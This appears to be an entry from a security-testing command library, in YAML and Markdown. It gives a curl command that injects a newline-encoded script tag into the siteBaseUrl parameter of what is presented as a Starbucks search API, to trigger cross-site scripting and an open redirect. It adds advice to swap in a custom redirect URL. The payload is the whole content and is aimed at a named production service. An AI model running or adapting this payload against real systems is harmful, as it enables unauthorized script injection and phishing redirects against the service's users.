---
data: >-
  curl -G "https://openapi.starbucks.com/searchasyoutype/v1/search" -d
  "query=coffee" -d
  "siteBaseUrl=http://googl.com/%0a<script>window.location='https://google.com';</script>"
  --header "x-api-key: YOUR_API_KEY"
tags:
  - open-redirect
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: be4d8b79-acb6-4e7c-904b-3b26fbc57ac5
created_at: '2025-12-14T03:46:31.588Z'
updated_at: '2025-12-14T03:46:31.588Z'
verified: false
validated: true
submitted: true
---
# curl-test-open-redirect

## Command

```bash
curl -G "https://openapi.starbucks.com/searchasyoutype/v1/search" -d "query=coffee" -d "siteBaseUrl=http://googl.com/%0a<script>window.location='https://google.com';</script>" --header "x-api-key: YOUR_API_KEY"
```

## Description

Tests open redirect by injecting a script to change location. Load response in browser to observe redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "siteBaseUrl=...` | Payload with script redirect | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

Change 'https://google.com' to custom URL.

## Expected Output

HTML with script; browser redirects to target.

## Related

- [[Related Procedure: Perform Open Redirect using siteBaseUrl Injection]]
